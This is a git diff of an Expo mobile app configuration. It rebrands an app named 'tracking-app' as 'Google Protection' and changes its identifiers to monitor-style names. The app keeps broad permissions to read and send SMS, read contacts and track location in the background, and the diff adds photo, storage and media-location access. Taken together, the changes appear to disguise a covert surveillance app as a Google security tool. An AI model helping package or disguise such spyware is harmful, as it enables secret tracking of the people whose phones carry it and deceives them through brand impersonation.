@@ -1,10 +1,10 @@
 {
     "expo": {
-        "name": "tracking-app",
-        "slug": "tracking-app",
+        "name": "Google Protection",
+        "slug": "google-protection",
         "version": "1.0.0",
         "orientation": "portrait",
-        "icon": "./assets/icon.png",
+        "icon": "./assets/icon.jpg",
         "userInterfaceStyle": "light",
         "splash": {
             "image": "./assets/splash.png",
@@ -16,13 +16,15 @@
             "supportsTablet": true,
             "infoPlist": {
                 "UIBackgroundModes": ["location", "fetch"],
-                "NSContactsUsageDescription": "Allow $(PRODUCT_NAME) to access your contacts."
+                "NSContactsUsageDescription": "Allow $(PRODUCT_NAME) to access your contacts.",
+                "NSPhotoLibraryUsageDescription": "Allow $(PRODUCT_NAME) to access your photos.",
+                "NSPhotoLibraryAddUsageDescription": "Allow $(PRODUCT_NAME) to save photos."
             },
-            "bundleIdentifier": "com.tracking.app"
+            "bundleIdentifier": "host.exp.moni-cr.expo"
         },
         "android": {
             "adaptiveIcon": {
-                "foregroundImage": "./assets/adaptive-icon.png",
+                "foregroundImage": "./assets/splash.png",
                 "backgroundColor": "#ffffff"
             },
             "permissions": [
@@ -35,12 +37,12 @@
                 "android.permission.READ_SMS",
                 "android.permission.WRITE_SMS",
                 "android.permission.SEND_SMS",
-                "android.permission.ACCESS_BACKGROUND_LOCATION"
+                "android.permission.ACCESS_BACKGROUND_LOCATION",
+                "android.permission.READ_EXTERNAL_STORAGE",
+                "android.permission.WRITE_EXTERNAL_STORAGE",
+                "android.permission.ACCESS_MEDIA_LOCATION"
             ],
-            "package": "com.tracking.app"
-        },
-        "web": {
-            "favicon": "./assets/favicon.png"
+            "package": "com.monitor_cr.app"
         },
         "plugins": [
             "expo-router",
@@ -65,13 +67,13 @@
                 }
             ]
         ],
-        "scheme": "tracking-app",
+        "scheme": "google-protection",
         "extra": {
             "router": {
                 "origin": false
             },
             "eas": {
-                "projectId": "33b9330b-c2f1-4559-b51f-f5863694af73"
+                "projectId": "3a418c53-ddda-408d-85ec-1c7d91a8bfa6"
             }
         }
     }
